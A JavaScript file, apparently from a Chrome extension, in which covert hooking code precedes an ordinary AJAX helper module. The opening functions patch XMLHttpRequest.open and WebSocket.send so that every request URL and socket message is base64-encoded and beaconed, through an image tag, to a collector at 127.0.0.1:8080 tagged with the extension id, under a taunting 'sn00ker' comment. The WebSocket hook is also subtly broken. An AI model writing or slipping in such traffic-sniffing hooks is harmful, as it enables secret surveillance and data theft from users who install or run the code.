function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var AJAX;
(function (AJAX) {
    function open(req) {
        return new Promise(function (resolve, reject) {
            var xhr = new XMLHttpRequest();
            xhr.open(req.method, req.url, true);
            xhr.onreadystatechange = function (e) {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    resolve(xhr);
                }
            };
            xhr.onerror = function (err) {
                reject(err);
            };
            xhr.onabort = function (e) {
                reject(e);
            };
            if (req.timeout) {
                xhr.timeout = req.timeout;
            }
            if (req.type) {
                xhr.overrideMimeType(req.type);
            }
            xhr.send(req.data);
        });
    }
    function readJSON(url) {
        return get({ url: url, responseType: 'text/plain' }).then(function (xhr) {
            if (xhr.status == 200) {
                return Promise.resolve(JSON.parse(xhr.responseText));
            }
            return Promise.reject(new Error("Unable to load JSON: status:\"" + xhr.status + "\" URL:\"" + url + "\""));
        });
    }
    AJAX.readJSON = readJSON;
    function get(req) {
        var params = Object.keys(req.data || {}).reduce(function (values, key) {
            var value = req.data[key];
            if (value !== undefined && value !== null && String(value).length) {
                value = key + "=" + encodeURIComponent(value);
            }
            else {
                value = key;
            }
            values.push(value);
            return values;
        }, []).join('&');
        var url = req.url;
        if (params.length) {
            url = [url, url.indexOf('?') < 0 ? '?' : '&', params].join('');
        }
        return open({ method: 'GET', url: url, type: req.responseType });
    }
    AJAX.get = get;
    function post(req) {
        var form = Object.keys(req.data || {}).reduce(function (form, key) {
            form.append(key, req.data[key]);
            return form;
        }, new FormData());
        return open({ method: 'POST', url: req.url, data: form, type: req.responseType });
    }
    AJAX.post = post;
})(AJAX || (AJAX = {}));
